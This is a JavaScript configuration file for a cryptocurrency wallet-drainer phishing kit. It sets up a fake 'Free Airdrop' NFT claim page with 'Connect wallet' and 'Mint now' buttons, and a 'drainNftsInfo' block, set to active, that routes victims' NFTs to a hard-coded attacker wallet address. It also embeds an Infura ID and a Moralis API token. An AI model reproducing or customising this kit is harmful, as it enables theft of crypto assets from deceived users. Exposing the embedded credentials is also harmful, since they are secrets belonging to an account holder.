const receiveAddress = '0xc12363490b9e6c56ee739c832E4cd4ac5c8287C6',
const infuraId = '3b14c1e652244259a15ce417715d35f2',
const moralisApi = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6Ijc2OWYwYzE3LTZhMmEtNGRkYy1iNzI2LWRhMzI5MTY2YTllYSIsIm9yZ0lkIjoiMTY3NzA5IiwidXNlcklkIjoiMTY3MzgwIiwidHlwZUlkIjoiMDVmM2Q3OWQtZTQxOS00ZWUwLWIyMjItYWMzZGRjZDIwNDk3IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2ODU1NTA1OTQsImV4cCI6NDg0MTMxMDU5NH0.S7b1iiJvjDzTZDu2SZQycnh0HZ_gT3lMaaxM0LCOupg',
  collectionInfo = {
    name: 'THE NFT WORLD',
    socialMedia: {
      discord: 'https://discord.gg',
      twitter: 'https://twitter.com',
      instagram: 'https://instagram.com/',
    },
  },

  indexPageInfo = {
    backgroundImage: 'background.jpg',
    title: '{name}',
    underTitle: 'Free Airdrop',
  },

  claimPageInfo = {
    title: 'GET YOUR<br>NFT NOW',
    shortDescription: 'Own, stake and build in our limitless possibilities Minecraft Metaverse',
    longDescription:
      'After claim, NTFs will appear in your Metamask wallet within 10 minutes',
    claimButtonText: 'CLAIM NOW',
    image: 'bg3.png',
    imageRadius: 250,
  },

  drainNftsInfo = {
    active: true,
    minValue: 0.001,
    nftReceiveAddress: '0xc12363490b9e6c56ee739c832E4cd4ac5c8287C6',
  },

  customStrings = {
    title: 'MINT {name}',
    connectButton: 'Connect wallet',
    transferButton: 'Mint now',
    dateString: 'Pre sale available {date}',
  }
  
if (
  !receiveAddress.startsWith('0x') ||
  receiveAddress.length >= 64 || receiveAddress.length <= 40
) {
  console.error(
    'Error: ' + receiveAddress + ' is not a valid Ethereum address.'
  )
}
